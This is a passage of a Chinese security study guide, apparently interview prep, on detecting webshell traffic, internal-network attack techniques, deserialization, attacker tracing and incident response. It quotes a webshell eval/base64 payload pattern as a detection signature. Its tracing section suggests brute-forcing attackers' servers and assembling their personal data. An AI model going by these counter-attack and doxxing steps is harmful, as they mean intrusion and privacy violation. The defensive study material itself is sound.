+<h3 id="蚁剑："><a href="#蚁剑：" class="headerlink" title="蚁剑："></a>蚁剑：</h3><p>可以对流量进行加密、混淆。但是有些关键代码没有被加密，如：PHP中的ini_set；ASP中的OnError，response等</p>
+<p>PHP类WebShell链接流量</p>
+<p>对php中的某些代码没有加密，例如ini_set，set_time_limit。比较容易被识别</p>
+<p>ASP类WebShell</p>
+<p>OnError ResumeNext，response等没有被加密，是明文的形式，比较容易识别</p>
+<p>execute在蚁剑中被打断混淆了，变成了拼接形式Ex”&amp;cHr(101)&amp;”cute</p>
+<p>蚁剑绕过特征流量</p>
+<p>蚁剑混淆加密后还有一个比较明显的特征，即为参数名大多以“_0x…&#x3D;”这种形式</p>
+<h3 id="冰蝎："><a href="#冰蝎：" class="headerlink" title="冰蝎："></a>冰蝎：</h3><p>accept</p>
+<p>ua头</p>
+<p>长链接</p>
+<p>Cookie:冰蝎的机制是需要从set-cookie中去取值，所以在发包中即使是有了cookie，他的接收包中都会有setcookie,除去第一个包没有。</p>
+<h4 id="1-冰蝎的的内存马怎么查杀"><a href="#1-冰蝎的的内存马怎么查杀" class="headerlink" title="1.冰蝎的的内存马怎么查杀?"></a>1.冰蝎的的内存马怎么查杀?</h4><p>冰蝎内存马用的是jvm加载类字节码的能力，常规的工具很难检测查杀，github上已经有查杀冰蝎jvm内存马的工具。</p>
+<h3 id="哥斯拉："><a href="#哥斯拉：" class="headerlink" title="哥斯拉："></a>哥斯拉：</h3><p>哥斯拉页面配置中header中有三个固定值，user-agent,accept,accept-language。</p>
+<p>是基于流量、HTTP全加密的webshell工具</p>
+<p>哥斯拉全部类型的shell 能绕过市面所有静态查杀</p>
+<p>哥斯拉流量加密 能绕过市面全部流量waf</p>
+<h3 id="菜刀流量特征-最开始是明文传输，后来采用base64加密-：PHP类WebShell链接流量"><a href="#菜刀流量特征-最开始是明文传输，后来采用base64加密-：PHP类WebShell链接流量" class="headerlink" title="菜刀流量特征(最开始是明文传输，后来采用base64加密)：PHP类WebShell链接流量"></a>菜刀流量特征(最开始是明文传输，后来采用base64加密)：PHP类WebShell链接流量</h3><p>如下：</p>
+<p>第一：“eval”，eval函数用于执行传递的攻击payload，这是必不可少的；</p>
+<p>第二：(base64_decode($_POST[z0]))，(base64_decode($_POST[z0]))将攻击payload进行Base64解码，因为菜刀默认是使用Base64编码，以避免被检测；</p>
+<p>第三：&amp;z0&#x3D;QGluaV9zZXQ…，该部分是传递攻击payload，此参数z0对应$_POST[z0]接收到的数据，该参数值是使用Base64编码的，所以可以利用base64解码可以看到攻击明文。</p>
+<p>注：</p>
+<p>1.有少数时候eval方法会被assert方法替代。</p>
+<p>2.$_POST也会被$_GET、$_REQUEST替代。</p>
+<p>3.z0是菜刀默认的参数，这个地方也有可能被修改为其他参数名。</p>
+<h3 id="蚁剑（PHP用base64加密）："><a href="#蚁剑（PHP用base64加密）：" class="headerlink" title="蚁剑（PHP用base64加密）："></a>蚁剑（PHP用base64加密）：</h3><p>PHP类WebShell链接流量</p>
+<p>将蚁剑的正文内容进行URL解码后，流量最中明显的特征为@ini_set(“display_errors”,”0”);这段代码基本是所有WebShell客户端链接PHP类WebShell都有的一种代码，但是有的客户端会将这段编码或者加密，而蚁剑是明文，所以较好发现，同时蚁剑也有eval这种明显的特征。</p>
+<p>蚁剑绕过特征流量</p>
+<p>由于蚁剑中包含了很多加密、绕过插件，所以导致很多流量被加密后无法识别，但是蚁剑混淆加密后还有一个比较明显的特征，即为参数名大多以“_0x…..&#x3D;”这种形式（下划线可替换为其他）所以，以_0x开头的参数名，后面为加密数据的数据包也可识别为蚁剑的流量特征。</p>
+<h3 id="冰蝎（AES对称加密）："><a href="#冰蝎（AES对称加密）：" class="headerlink" title="冰蝎（AES对称加密）："></a>冰蝎（AES对称加密）：</h3><p>通过HTTP请求特征检测</p>
+<p>1、冰蝎数据包总是伴随着大量的content-type：application什么什么，无论GET还是POST，请求的http中，content-type为application&#x2F;octet-stream；</p>
+<p>2、冰蝎3.0内置的默认内置16个ua（user-agent）头</p>
+<p>3、content-length 请求长度，对于上传文件，命令执行来讲，加密的参数不定长。但是对于密钥交互，获取基本信息来讲，payload都为定长</p>
+<h3 id="哥斯拉（base64加密）："><a href="#哥斯拉（base64加密）：" class="headerlink" title="哥斯拉（base64加密）："></a>哥斯拉（base64加密）：</h3><p>特征检测</p>
+<p>1、发送一段固定代码（payload），http响应为空</p>
+<p>2、发送一段固定代码（test），执行结果为固定内容</p>
+<p>3、发送一段固定代码（getBacisInfo）</p>
+<h3 id="1-Webshell流量交互的流量特征有哪些"><a href="#1-Webshell流量交互的流量特征有哪些" class="headerlink" title="1 Webshell流量交互的流量特征有哪些"></a>1 Webshell流量交互的流量特征有哪些</h3><p>1)Webshell是用来控制服务器的，在控制服务器的过程中，就会触发许多系统 函数，例如eval、zO (菜刀特征)、shell,需监控这些关键的函数，具体需要查看 是哪个网页发起的请求进行鉴别。</p>
+<p>2)Webshell连接可能使用base64编码，正常功能也会使用base64容易引起误 报，一般与eval数量对比，数量差异较小时可能被上传webshell进行编码通讯。</p>
+<p>3)除了系统函数、base64编码通讯外,还存在int_set(“display_errors”,”0”),为 Webshell流量特征之一。</p>
+<p>4)还可以监控ifconfig whoami ipconfig等关键命令，这是获得Webshell后基本 上都会执行的命令。</p>
+<h3 id="Webshell特征"><a href="#Webshell特征" class="headerlink" title="Webshell特征"></a>Webshell特征</h3><p>1.一般文件名后缓为jsp、php、py、asp等;</p>
+<p>2.一般Web应用会对上传后的文件名做二次命名,例如通过uid、时间戳等方法进行重命名,特征一为较长的字母数字组合 jsp(asp&#x2F;php&#x2F;Py等)</p>
+<p>3.由于 webshell内需要执行对应的功能,例如执行命令,连接数据库等,所以文件内容中会存在</p>
+<p>相关编译语言的函数关键字,例如 Runtime. getruntime(0、 connection()、eval、 request System等。</p>
+<p>4.一般 webshell里可能有对应的访向控制,所以内容中可能会包含 username. password之类的字样</p>
+<p>5.既然是上传文件,那么上传 webshel的数据包的 content-type参数的值一般都是multipart&#x2F;form-data</p>
+<p>6.常见一些 webshell命名,例如 webshellj sp、jspy、jip等</p>
+<p>\7. webshell的访问路径一般是文件上传目录,例如&#x2F; upload、 &#x2F;image等</p>
+<h2 id="webshell分析思路"><a href="#webshell分析思路" class="headerlink" title="webshell分析思路"></a>webshell分析思路</h2><p>1.基于webshell特征检测</p>
+<p>常见webshell函数</p>
+<p>（1）存在系统调用的命令执行函数，如eval、system、cmd_shell、assert等；</p>
+<p>（2）存在系统调用的文件操作函数，如fopen、fwrite、readdir等；</p>
+<p>（3）存在数据库操作函数，调用系统自身的存储过程来连接数据库操作；</p>
+<p>（4）具备很深的自身隐藏性、可伪装性，可长期潜伏到web源码中；</p>
+<p>（5）衍生变种多，可通过自定义加解密函数、利用xor、字符串反转、压缩、截断重组等方法来绕过检测；</p>
+<p>基于webshell工具特征的检测</p>
+<h3 id="webshell的访问特征"><a href="#webshell的访问特征" class="headerlink" title="webshell的访问特征"></a>webshell的访问特征</h3><p>1）少量的IP对其发起访问</p>
+<p>2）总的访问次数少</p>
+<p>3）该页面属于孤立页面</p>
+<h3 id="webshell防御"><a href="#webshell防御" class="headerlink" title="webshell防御"></a>webshell防御</h3><p>1.建议用户通过ftp来上传、维护网页，尽量不安装asp的上传程序。</p>
+<p>2.对asp上传程序的调用一定要进行身份认证，并只允许信任的人使用上传程序。</p>
+<p>3.asp程序管理员的用户名和密码要有一定复杂性，不能过于简单，还要注意定期更换。</p>
+<p>\4. 到正规网站下载程序，下载后要对数据库名称和存放路径进行修改，数据库名称要有一定复杂性。</p>
+<p>5.要尽量保持程序是最新版本。</p>
+<p>6.不要在网页上加注后台管理程序登陆页面的链接。</p>
+<p>7.防止程序有未知漏洞，可以在维护后删除后台管理程序的登陆页面，下次维护时再通过上传即可。</p>
+<p>8.要时常备份数据库等重要文件。</p>
+<p>9.日常要多维护，并注意空间中是否有来历不明的asp文件。</p>
+<p>10.尽量关闭网站搜索功能，利用外部搜索工具，以防爆出数据。</p>
+<p>11.利用白名单上传文件，不在白名单内的一律禁止上传，上传目录权限遵循最小权限原则。</p>
+<h2 id="设备"><a href="#设备" class="headerlink" title="设备"></a>设备</h2><p>常见安全设备  ids 。hids 。nids。IPS 。 av 。edr 。 apt，利用厂商安全设备的日志和报警来对攻击进行研判</p>
+<p>WAF：Web应用防火墙 —应用层的攻击防护</p>
+<p>IDS：入侵检测系统 </p>
+<p>IPS：入侵防御系统</p>
+<p>SOC：安全运营中心</p>
+<p>SIEM：信息安全事件管理</p>
+<p>Vulnerability Scanner：漏洞扫描器</p>
+<p>UTM：统一威胁管理</p>
+<p>抗DDOS产品</p>
+<p>FireWall：防火墙—上网行为管理软件，主机安全</p>
+<p>VPN：虚拟专用网</p>
+<p>常见的 HW 设备有：公安部网防G01、K01、360网康&#x2F;网神防火墙、微步威胁情报、安恒云-Web应用防火墙（玄武盾）、默安蜜罐、知道创宇蜜罐、山石防火墙</p>
+<p>NGAF&#x2F;NGFW：下一代 Web 应用防火墙（Next Generation Application Firewall，通防火墙和下一代防火墙的区别），聚合了以下功能</p>
+<p>IDS</p>
+<p>HIDS：基于主机的入侵检测系统</p>
+<p>NIDS：基于网络的入侵检测系统</p>
+<p>HIDS+NIDS：基于混合数据源的入侵检测系统</p>
+<p>IPS：入侵防御系统</p>
+<p>AV：反病毒系统</p>
+<p>EDR：主机安全管理\终端检测和响应</p>
+<p>EDR 实时监测终端上发生的各类行为，采集终端运行状态，在后端通过大数据安全分析、机器学习、沙箱分析、行为分析、机器学习等技术，提供深度持续监控、威胁检测、高级威胁分析、调查取证、事件响应处置、追踪溯源等功能，可第一时间检测并发现恶意活动，包括已知和未知威胁，并快速智能地做出响应，全面赋予终端主动、积极的安全防御能力</p>
+<p> 简单来说就是给内网环境中所有主机安装管理软件终端，可以在管理平台集中管理和数据分析过滤，基本所有安全厂商都有自己的 EDR 产品</p>
+<p>运维审计和管理平台（堡垒机）</p>
+<p>DAS：数据库安全审计平台</p>
+<p>LAS：日志审计安全平台</p>
+<p>AC：上网行为管理系统</p>
+<p>伪装欺骗系统（蜜罐、蜜网）</p>
+<p>SIP：安全态势感知平台</p>
+<p>这个算是让整套系统性能得到提升的灵魂了，定位为客户的安全大脑，是一个集检测、可视、响应处置于一体的大数据安全分析平台。产品以大数据分析为核心，支持主流的安全设备、网络设备、操作系统等多源数据接入，利用大数据、关联分析、告警降噪等技术，实现海量数据的统一挖掘分析</p>
+<p>你用过微步吗？</p>
+<p>微步在线是一个威胁情报中心，可以通过 ip 或域名查询其是不是恶意的，对于判断恶意链接具有一定的参考性，他还有一个插件可以在页面选中就能进行查询，还是一个比较好用的工具</p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p><strong>渗透测试流程</strong></p>
+<p>首先信息收集，收集子域名、Whois、C段、旁站、Web 系统指纹识别，然后测试 web 系统的漏洞</p>
+<h3 id="金银票区别"><a href="#金银票区别" class="headerlink" title="金银票区别"></a><strong>金银票区别</strong></h3><table>
+<thead>
+<tr>
+<th>区别点</th>
+<th>黄金票据</th>
+<th>白银票据</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>访问权限</td>
+<td>获取任何Kerberos服务权限</td>
+<td>访问指定的服务</td>
+</tr>
+<tr>
+<td>加密方式</td>
+<td>由krbtgt的Hash加密</td>
+<td>由服务账号(通常为计算机帐户)Hash加密</td>
+</tr>
+<tr>
+<td>认证流程</td>
+<td>需要经过域控</td>
+<td>不需要经过域控</td>
+</tr>
+<tr>
+<td>生成的票据</td>
+<td>TGT票据</td>
+<td>TGS票据</td>
+</tr>
+</tbody></table>
+<h3 id="黄金票据怎么拿域管"><a href="#黄金票据怎么拿域管" class="headerlink" title="黄金票据怎么拿域管?"></a>黄金票据怎么拿域管?</h3><p>知识：Kerberos认证(krb)</p>
+<p>域管krbtgt的hash</p>
+<h3 id="0-是否存在域"><a href="#0-是否存在域" class="headerlink" title="0.是否存在域"></a>0.是否存在域</h3><p>Ipconfig&#x2F;all systeminfo 还有net config workastion看工作站</p>
+<h3 id="1-域控的权限维持"><a href="#1-域控的权限维持" class="headerlink" title="1.域控的权限维持"></a><strong>1.域控的权限维持</strong></h3><p>第一次拿到域管后，第二次的域渗透只需要域管的hash就可以做成票据，拿域管的权限。</p>
+<p>或者还有ske-key的万能密码，我知道他的原理是注入lsass进程。不需要域管密码和hash。用域用户身份也可以登录。</p>
+<h3 id="2-常用的横向手法"><a href="#2-常用的横向手法" class="headerlink" title="2.常用的横向手法"></a><strong>2.常用的横向手法</strong></h3><p>1.ptk(密钥)</p>
+<p>2.pth（通过hash，就是用minikatz做pth的横向）</p>
+<p>3.域里面的常用漏洞</p>
+<p>Ms14-068 吧域内用户获得域管权限。</p>
+<p>4.白银票据</p>
+<p>和黄金票据差别是他不是域控加密的，是服务器本身的ntlm加密。</p>
+<h3 id="网络基础"><a href="#网络基础" class="headerlink" title="网络基础"></a><strong>网络基础</strong></h3><p>打内网大部分流量都走socks协议，有防火墙过不去</p>
+<p>Regeorg(瑞joju)和代理链 都是socks协议的代理。</p>
+<p>Socks协议走的是tcp，不支持icmp，所以不能ping。</p>
+<p>正向代理：客户端代理 服务器不知道客户端的真实ip。</p>
+<p>反向代理: 服务端代理 客户端是不知道服务器的真实地址。</p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a><strong>提权</strong></h3><p>Windows提权</p>
+<p>1.土豆全家桶，photo(smb)</p>
+<p>2.常用的补丁提权，syteminfo复制系统信息，拿去辅助提权。</p>
+<p>3.数据库提权，mysql的udf提权。(安全模式未开，root权限)</p>
+<p>4.很常用的ms14-068驱动提权。</p>
+<p>5.配置不当的提权，注册表的install安装配置的话是最高权限启动的。</p>
+<p>Linux 提权</p>
+<p>1.内核提权(脏牛) 和windows一样看系统内核 uname-a</p>
+<p>2.sudo提权 就是很多运维给普通用户通过sudo执行root命令的权限，条件的话需要sudo没密码。</p>
+<p>3.写计划任务，还有mysql的udf提权。</p>
+<h3 id="命令行工具用的什么比较多"><a href="#命令行工具用的什么比较多" class="headerlink" title="命令行工具用的什么比较多"></a><strong>命令行工具用的什么比较多</strong></h3><p>xshell、xftp、finalshell</p>
+<h3 id="哪些漏洞经常被用于打点？"><a href="#哪些漏洞经常被用于打点？" class="headerlink" title="哪些漏洞经常被用于打点？"></a><strong>哪些漏洞经常被用于打点</strong>？</h3><p>边界网络设备资产跟弱口令结合</p>
+<p>上传漏洞</p>
+<p>Log4j</p>
+<p>Apache Shiro漏洞</p>
+<p>Fastjson漏洞</p>
+<h2 id="序列化反序列化"><a href="#序列化反序列化" class="headerlink" title="序列化反序列化"></a>序列化反序列化</h2><p>序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中,反序列化即逆过程，由字节流还原成对象</p>
+<h3 id="Java序列化"><a href="#Java序列化" class="headerlink" title="Java序列化"></a><strong>Java序列化</strong></h3><p>​	WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些应用的反序列化漏洞</p>
+<p>​	Java中的ObjectOutputStream类的writeObject()方法可以实现序列化，</p>
+<p>ObjectInputStream类的readObject()方法用于反序列化。</p>
+<p>在java读取完字节流后，会判断是否存在用户自定义的“readObject”方法，如果存在的话，就优先使用udf。所以，如果存在一个自定义了“readObject”方法的对象，而这个方法是危险的，比如说执行系统命令，就会导致反序列化后形成威胁。</p>
+<p>怎样防范？</p>
+<p>需要在objectinputstream类反序列化时，对生成的对象类型做限制，比如说设置白名单</p>
+<p>挖矿病毒排查处置</p>
+<h3 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a><strong>PHP反序列化</strong></h3><p>PHP反序列化的时候，基本都是围绕着serialize()，unserialize()这两个函数</p>
+<p>二进制格式</p>
+<p>字节数组</p>
+<p>json字符串</p>
+<p>xml字符串</p>
+<p>布尔型（bool）：b</p>
+<p>整数型（int）：i</p>
+<p>字符串型（str）：s</p>
+<p>数组型（array）：a</p>
+<p>对象型（object）：O</p>
+<p>NULL型：N</p>
+<p><strong>原因</strong></p>
+<p>对用户的输入检测不严</p>
+<p>1、无类：</p>
+<p>当未检测出攻击者输入的序列化字符串中包含的恶意执行语句</p>
+<p>攻击者从而达到控制反序列化过程，进而进行恶意代码的执行（好比SQL注入，目录遍历等操作）</p>
+<p>2、有类：</p>
+<p>当进行反序列化的时候就有可能会触发对象中的一些魔术方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">_construct</span>()     <span class="comment">//创建对象时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()     <span class="comment">//对象销毁时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__call</span>()     <span class="comment">//在对象中调用不可访问的方法时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>()     <span class="comment">//在静态中调用不可访问的方法时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__get</span>()     <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__set</span>()     <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__isset</span>()     <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__unset</span>()     <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>()     <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>()     <span class="comment">//执行unserialize()时，先会调用这个函数</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()     <span class="comment">//执行serialize()时，先会调用这个函数</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><p>你还用过其他态势感知的产品吗？</p>
+<p>ips，ids，hids，堡垒机等</p>
+<p>网页状态码</p>
+<ul>
+<li><input disabled="" type="checkbox"> 403 （禁止） 服务器拒绝请求。</li>
+<li><input disabled="" type="checkbox"> 404 （未找到） 服务器找不到请求的网页。</li>
+<li><input disabled="" type="checkbox"> 301 （永久移动） 请求的网页已永久移动到新位置。 服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置。</li>
+<li><input disabled="" type="checkbox"> 302 （临时移动） 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。</li>
+<li><input disabled="" type="checkbox"> 500 （服务器内部错误） 服务器遇到错误，无法完成请求。</li>
+<li><input disabled="" type="checkbox"> 501 （尚未实施） 服务器不具备完成请求的功能。 例如，服务器无法识别请求方法时可能会返回此代码。</li>
+<li><input disabled="" type="checkbox"> 502 （错误网关） 服务器作为网关或代理，从上游服务器收到无效响应。</li>
+<li><input disabled="" type="checkbox"> 503 （服务不可用） 服务器目前无法使用（由于超载或停机维护）。 通常，这只是暂时状态。</li>
+<li><input disabled="" type="checkbox"> 504 （网关超时） 服务器作为网关或代理，但是没有及时从上游服务器收到请求。</li>
+<li><input disabled="" type="checkbox"> 505 （HTTP 版本不受支持） 服务器不支持请求中所用的 HTTP 协议版本。</li>
+</ul>
+<h3 id="端口如21-22-23-53-3389等端口是干什么的"><a href="#端口如21-22-23-53-3389等端口是干什么的" class="headerlink" title="端口如21.22.23.53.3389等端口是干什么的"></a>端口如21.22.23.53.3389等端口是干什么的</h3><p>21：FTP文件传输协议</p>
+<p>22：SSH远程连接</p>
+<p>23：TELNET远程登录</p>
+<p>25：SMTP邮件服务</p>
+<p>53：DNS域名系统</p>
+<p>80：HTTP超文本传输协议</p>
+<p>443：HTTPS安全超文本传输协议</p>
+<p>1433：MSSQL</p>
+<p>3306：MYSQL</p>
+<p>3389：windows远程桌面服务端口</p>
+<p>7701：weblogic</p>
+<p>8080：TCP,HTTP协议代理服务器：Apache-tomcat默认端口号</p>
+<p>WAF允许的HTTP请求方法如下： GET、POST、HEAD、PUT、DELETE、MKCOL、COPY、MOVE、OPTIONS、PROPFIND、PROPPATCH、LOCK、UNLOCK、TRACE、SEARCH、CONNECT、CHECKOUT、LABEL、UPDATE、REPORT、CHECKIN、CHECKOUT、UNCHECKOUT、MERGE、MKACTIVITY、BPROPPATCH、MKWORKSPACE、VERSION-CONTROL、BASELINE-CONTROL</p>
+<p><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/wps1.png" alt="img"> </p>
+<p><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/wps2.png" alt="img"> </p>
+<h2 id="溯源"><a href="#溯源" class="headerlink" title="溯源"></a>溯源</h2><p>溯源反制思路</p>
+<p>红队攻击都会挂着代理，你溯源的话只能溯源到他的代理ip，没有太大的意义，如果说服务器被上了内存马的情况，可以去工具取样他内存马的ip，对内存马ip反向扫描端口，</p>
+<p>因为他们也是通过远程进去的，去爆破他们的ssh,3389和cs的密码。</p>
+<p>反序列化的取样，他打shiro，里面就有他的基本设备vps，通过中间件吧这些有特征的ip收集，放到在线情报平台上识别，检测是不是有ip绑定域名的，通过whois反查他的域名注册时间、邮箱，通过社工库查他的手机号，然后通过社交软件，qq、微信、支付宝来给他转一毛钱，拼接他的个人信息。</p>
+<p>流量溯源</p>
+<p>先看日志，看攻击时间做一个审计，搜索这个时间文件上传的操作，一般是GET和POST两种，GET的话可以直接看到他请求的资源、地址和content，然后webshell该杀就杀，后门改补就补，如果是POST，那么就看不到请求的内容，可以去防火墙上下载完整数据包来分析。</p>
+<h3 id="1-攻击源捕获"><a href="#1-攻击源捕获" class="headerlink" title="1.攻击源捕获"></a>1.攻击源捕获</h3><p>安全设备报警，如扫描IP、威胁阻断、病毒木马、入侵事件等</p>
+<p>日志与流量分析，异常的通讯流量、攻击源与攻击目标等</p>
+<p>服务器资源异常，异常的文件、账号、进程、端口，启动项、计划任务和服务等</p>
+<p>邮件钓鱼，获取恶意文件样本、钓鱼网站 URL 等</p>
+<p>蜜罐系统，获取攻击者 ID、电脑信息、浏览器指纹、行为、意图的相关信息</p>
+<h3 id="溯源反制"><a href="#溯源反制" class="headerlink" title="溯源反制"></a>溯源反制</h3><p>IP 定位技术</p>
+<p>根据IP定位物理地址–代理 IP</p>
+<p>溯源案例：通过 IP 端口扫描，反向渗透服务器进行分析，最终定位到攻击者相关信息</p>
+<p>ID 追踪术</p>
+<p>ID 追踪术，搜索引擎、社交平台、技术论坛、社工库匹配</p>
+<p>溯源案例：利用 ID 从技术论坛追溯邮箱，继续通过邮箱反追踪真实姓名，通过姓名找到相关简历信息</p>
+<p>网站 url</p>
+<p>域名 Whois 查询–注册人姓名、地址、电话和邮箱 –域名隐私保护</p>
+<p>溯源案例：通过攻击 IP 历史解析记录&#x2F;域名，对域名注册信息进行溯源分析</p>
+<p>恶意样本分析</p>
+<p>提取样本特征、用户名、ID、邮箱、C2 服务器等信息–同源分析</p>
+<p>溯源案例：样本分析过程中，发现攻击者的个人 ID 和 QQ，成功定位到攻击者</p>
+<p>社交账号</p>
+<p>基于 JSONP 跨域，获取攻击者的主机信息、浏览器信息、真实 IP 及社交信息等</p>
+<p>利用条件：可以找到相关社交网站的 jsonp 接口泄露敏感信息，相关网站登录未注销</p>
+<h3 id="3-攻击者画像"><a href="#3-攻击者画像" class="headerlink" title="3.攻击者画像"></a>3.攻击者画像</h3><p>攻击路径</p>
+<p>攻击目的：拿到权限、窃取数据、获取利益、DDOS 等</p>
+<p>网络代理：代理 IP、跳板机、C2 服务器等</p>
+<p>攻击手法：鱼叉式邮件钓鱼、Web渗透、水坑攻击、近源渗透、社会工程等</p>
+<p>攻击者身份画像</p>
+<p>虚拟身份：ID、昵称、网名</p>
+<p>真实身份：姓名、物理位置</p>
+<p>联系方式：手机号、qq&#x2F;微信、邮箱</p>
+<p>组织情况：单位名称、职位信息</p>
+<p>通常情况下，接到溯源任务时，获得的信息如下：</p>
+<p>攻击时间</p>
+<p>攻击IP</p>
+<p>预警平台</p>
+<p>攻击类型</p>
+<p>恶意文件</p>
+<p>受攻击域名&#x2F;IP</p>
+<p>其中攻击IP、攻击类型、恶意文件、攻击详情是溯源入手的点</p>
+<p>通过攻击类型分析攻击详情的请求包，看有没有攻击者特征，通过获取到的IP地址进行威胁情报查询来判断所用的IP是代理IP还是真实IP地址</p>
+<p>如端口扫描大概率为个人vps或者空间搜索引擎，可优先溯源</p>
+<p>如命令执行大概率为未经任何隐匿的网络、移动网络、接到脚本扫描任务的肉鸡，可优先溯源</p>
+<p>如爬虫大概率为空间搜索引擎，最后溯源</p>
+<p>如恶意文件可获得 c2 地址、未删除的带有敏感信息的代码（如常用 ID、组织信 息）、持续化控制代码（C2 地址指在 APT 攻击里的命令与控制，若获取到 C2 地址可以使我们的溯源目标更有针对性）</p>
+<p>持续化控制代码需要详细分析，如采用 DGA 域名上线的方法，分析出域名算法， 预测之后的域名可有效减少损失，增加溯源面。</p>
+<p>溯源结果框架</p>
+<p>经过一系列溯源操作后，理想情况下要获得如下数据，刻画攻击者画像</p>
+<p>姓名&#x2F;ID：</p>
+<p>攻击IP：</p>
+<p>地理位置：</p>
+<p>QQ：</p>
+<p>微信：</p>
+<p>邮箱：</p>
+<p>手机号：</p>
+<p>支付宝：</p>
+<p>IP地址所属公司：</p>
+<p>IP地址关联域名：</p>
+<p>其他社交账号信息（如微博&#x2F;SRC&#x2F;id证明）：</p>
+<p>人物照片：</p>
+<h2 id="应急"><a href="#应急" class="headerlink" title="应急"></a>应急</h2><p>你本人应急的案例</p>
+<p>我拿个之前的应急排查来说吧，就是我们这边接到通知他们公司几台服务器有问题，让我们去检测。然后看到是windows的机子，本地用户和组排查的时候发现新建可疑的用户，确定主机是有问题的，对方已经拿到主机权限,然后事件管理器有大量的登录日志爆破，采取的措施是直接删除可疑的和隐藏账号,排查登录日志,确定系统账号已经不安全,更新了管理员账号,对启动项和可疑进程做了清除,取了一份样本拿去分析,通告上级紧急修补web站点的漏洞.</p>
+<h3 id="已经被上传webshell应急"><a href="#已经被上传webshell应急" class="headerlink" title="已经被上传webshell应急"></a>已经被上传webshell应急</h3><p>被拿shell了如何处理（排查、清除、关站、看看可有即使修复的可能，没有可能就关站）</p>
+<p>系统如果已经被植入后门，说明攻击者已经攻击成功，而且拿到权限，这时候日志信息可能提供不了帮助，首先要去考虑系统的账户是否安全，，又没口令爆破成功的痕迹，排查账号的密码是否已经不安全.</p>
+<p>(Linux)的话看计划任务,没有定时反弹shell,还有就是进程是不是可疑在通信.发现可疑问题,就要样本分析.</p>
+<p>(windows)的话就看启动项和进程.</p>
+<p>如果是web入侵,看日志web服务是不是安全?还原攻击的流程.</p>
+<h3 id="应急响应的基本思路是什么？"><a href="#应急响应的基本思路是什么？" class="headerlink" title="应急响应的基本思路是什么？"></a>应急响应的基本思路是什么？</h3><p>准备-检测-抑制-根除-恢复-书写报告</p>
+<p>1、准备工作，收集信息：收集告警信息、客户反馈信息、设备主机信息等。</p>
+<p>2、检测，判断类型：安全事件类型的判断（钓鱼邮件，webshell，爆破，中毒等）</p>
+<p>3、抑制，控制范围，隔离失陷设备</p>
+<p>4、根除，分析研判，将收集的信息分析</p>
+<p>5、恢复，处置事件类型（进程、文件、邮件、启动项，注册表等）</p>
+<p>6、输出报告</p>
+<h3 id="Linux应急排查"><a href="#Linux应急排查" class="headerlink" title="Linux应急排查"></a>Linux应急排查</h3><p>1.和windows应急思路相同，登录账号检测</p>
+<p>2.后门排查(检测定时任务、开机启动项、异常端口(比如建立的可疑连接)，进程排查)</p>
+<p>update留意系统运行到现在登录多久、多少用户。</p>
+<p>1.影子账户，&#x2F;etc&#x2F;shadow因为&#x2F;etc&#x2F;passwd任何用户都可以访问，密码信息就分离到shadow,shadow文件只有root权限才能访问，如果说，stat命令发现，shodow文件权限变化了，这检测就有问题。</p>
+<p>Ssh公钥，linux的机子22端口基本都是开的，如果写公钥进去，就是明显的后门</p>
+<h3 id="Linux入侵排查思路"><a href="#Linux入侵排查思路" class="headerlink" title="Linux入侵排查思路;"></a>Linux入侵排查思路;</h3><p>1账号安全,2历史命令,3检查异常端口,4检查异常进程,</p>
+<p>5检查开机启动项,6检查定时任务,7检查服务,8检查异常文件,9检查系统日志</p>
+<h3 id="Linux-常用命令"><a href="#Linux-常用命令" class="headerlink" title="Linux 常用命令:"></a>Linux 常用命令:</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">history</span> (<span class="built_in">cat</span> /root/.bash_history) 查看执行过的命令,排查和溯源</span><br><span class="line"></span><br><span class="line">/etc/passwd 分析用户</span><br><span class="line"></span><br><span class="line">awk -F: 